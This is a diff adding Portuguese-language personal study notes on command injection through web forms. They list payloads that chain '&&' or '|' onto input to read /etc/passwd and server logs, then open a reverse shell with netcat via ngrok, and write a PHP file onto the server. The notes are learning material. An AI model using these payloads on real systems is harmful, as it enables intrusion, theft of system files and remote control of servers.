@@ -1,2 +1,27 @@
 - > Command Injection
-	- Assim como a injeção SQLinjection e XSS nos formulários a injeç 
+	
+	- Assim como a injeção SQLinjection e XSS que verificam os parâmetros de entrada para obter informações sobre banco de dados os formularios também 
+	são vulneraveis a injeções de entrada. 
+	exemplos: 
+		A técnica utilizada é fazer uma requisição normal ao site "xxx" somado ( junção )  "&&" e em seguida uma comando "ls", "/etc/passw", etc...  
+		xxx && cat index.php				' 	
+		xxx && cat cat /etc/passwd	 		''
+		xxx && cat /var/log/apache2/error.log		"
+		xxx && ls 
+	
+	- Além da junção &&, podemos concatenar |
+		exemplos:
+			xxx | index.php
+	
+	
+	observação: Se o formulário permite a injeção de códigos que está sendo rodado diretamente no servidor, podemos então criar um arquivo dentro do servidor 
+	pra que ele rode uma shell reversa. 
+	
+	nc -lvp 443 ( atacante escutando ) 
+	
+	injeção de parametros usando ngrok 
+	ngrok 443 
+	xxx && nc -e /bin/bash ip/port 
+	
+	pode-se fazer também: 
+	xxx && echo "<?php phpinfo(); ?>" > pasta.php pra obter informações do servidor no navegador 
